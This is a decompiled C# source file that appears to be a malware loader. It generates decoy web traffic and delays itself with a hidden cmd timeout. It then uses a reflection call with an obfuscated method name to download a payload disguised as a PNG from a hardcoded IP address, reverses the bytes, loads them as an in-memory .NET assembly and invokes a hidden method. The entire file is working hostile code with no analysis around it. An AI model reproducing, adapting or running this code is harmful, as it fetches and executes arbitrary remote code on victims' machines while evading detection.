using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Threading;

internal static class Class0
{
	internal static void smethod_0()
	{
		string[] array = new string[4] { "http://google.com", "http://youtube.com", "http://bing.com", "http://yahoo.com" };
		for (int i = 0; i < 9; i++)
		{
			string[] array2 = array;
			foreach (string address in array2)
			{
				WebClient webClient = new WebClient();
				try
				{
					string value = webClient.DownloadString(address);
					Console.WriteLine(value);
				}
				catch
				{
				}
				finally
				{
					((IDisposable)webClient).Dispose();
				}
			}
		}
		GC.Collect();
	}

	internal static void smethod_1()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		Thread thread = new Thread(smethod_0)
		{
			IsBackground = true
		};
		thread.Start();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/C timeout 20",
			WindowStyle = ProcessWindowStyle.Hidden
		})!.WaitForExit();
		byte[] array = null;
		array = (byte[])typeof(WebClient).GetMethod("DowOnlOoadDOata".Replace("O", ""), new Type[1] { typeof(string) })!.Invoke(new WebClient(), new object[1] { "http://20.51.217.113/ras/Gpogmr.png" });
		Array.Reverse((Array)array, 0, array.Length);
		AppDomain.CurrentDomain.Load(array);
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			Console.WriteLine(assembly.FullName);
			Type[] exportedTypes = assembly.GetExportedTypes();
			foreach (Type type in exportedTypes)
			{
				Console.WriteLine(type.FullName);
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					Console.WriteLine(methodInfo.Name);
					if (methodInfo.Name == "Pwkjlixkictegmd")
					{
						methodInfo.Invoke(null, null);
					}
				}
			}
		}
	}
}
